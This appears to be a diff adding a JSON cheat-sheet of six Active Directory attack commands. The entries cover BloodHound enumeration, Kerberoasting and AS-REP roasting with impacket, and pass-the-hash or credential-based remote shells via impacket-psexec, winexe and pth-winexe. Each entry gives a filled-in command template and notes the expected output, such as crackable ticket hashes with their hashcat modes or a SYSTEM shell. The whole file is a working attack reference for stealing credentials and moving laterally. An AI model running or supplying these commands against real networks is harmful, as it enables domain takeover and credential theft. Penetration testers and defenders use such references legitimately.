@@ -1,0 +1,86 @@
+[
+  {
+    "tool": "bloodhound",
+    "title": "Collect AD graph data",
+    "command": "bloodhound-python -u <user> -p <pass> -d domain.local -c all -ns <dc-ip>",
+    "description": "Gathers AD relationships for BloodHound. Import the JSON to map attack paths.",
+    "tags": [
+      "active directory",
+      "bloodhound",
+      "enumeration",
+      "attack path"
+    ],
+    "output": "JSON files to drag into the BloodHound GUI to find paths to Domain Admin."
+  },
+  {
+    "tool": "impacket",
+    "title": "Kerberoast service accounts",
+    "command": "impacket-GetUserSPNs domain.local/<user>:<pass> -request -dc-ip <dc-ip>",
+    "description": "Requests TGS tickets for SPN accounts. Crack the hashes offline for service creds.",
+    "tags": [
+      "active directory",
+      "kerberoast",
+      "kerberos",
+      "impacket",
+      "hashes"
+    ],
+    "output": "TGS hashes ($krb5tgs$) ready for hashcat mode 13100."
+  },
+  {
+    "tool": "impacket",
+    "title": "AS-REP roast",
+    "command": "impacket-GetNPUsers domain.local/ -usersfile users.txt -dc-ip <dc-ip>",
+    "description": "Targets accounts without Kerberos pre-auth. No password needed to request the hash.",
+    "tags": [
+      "active directory",
+      "asrep",
+      "kerberos",
+      "impacket",
+      "hashes"
+    ],
+    "output": "$krb5asrep$ hashes for crackable accounts (hashcat mode 18200)."
+  },
+  {
+    "tool": "impacket",
+    "title": "Pass-the-hash shell",
+    "command": "impacket-psexec -hashes :<nthash> Administrator@<target>",
+    "description": "Authenticate with an NT hash instead of a password. SYSTEM shell via SMB.",
+    "tags": [
+      "active directory",
+      "pass the hash",
+      "lateral movement",
+      "impacket"
+    ],
+    "output": "An interactive SYSTEM shell on the target when the hash is valid."
+  },
+  {
+    "tool": "winexe",
+    "title": "Remote command execution",
+    "command": "winexe -U <user>%<pass> //<target> cmd.exe",
+    "description": "Runs commands on a remote Windows host over SMB with valid creds, an interactive cmd.exe shell (psexec-style, works without a domain).",
+    "tags": [
+      "winexe",
+      "smb",
+      "remote exec",
+      "lateral movement",
+      "windows",
+      "active directory"
+    ],
+    "output": "An interactive Windows shell on the target as the supplied user."
+  },
+  {
+    "tool": "pth-winexe",
+    "title": "Pass-the-hash shell (winexe)",
+    "command": "pth-winexe -U '<user>%<lm>:<nt>' //<target> cmd.exe",
+    "description": "Authenticate with an NTLM hash instead of a password to get a remote cmd.exe, no cracking needed. Part of the passing-the-hash suite.",
+    "tags": [
+      "pass the hash",
+      "pth",
+      "winexe",
+      "ntlm",
+      "lateral movement",
+      "active directory"
+    ],
+    "output": "A remote shell using only the hash, when it is valid on the target."
+  }
+]
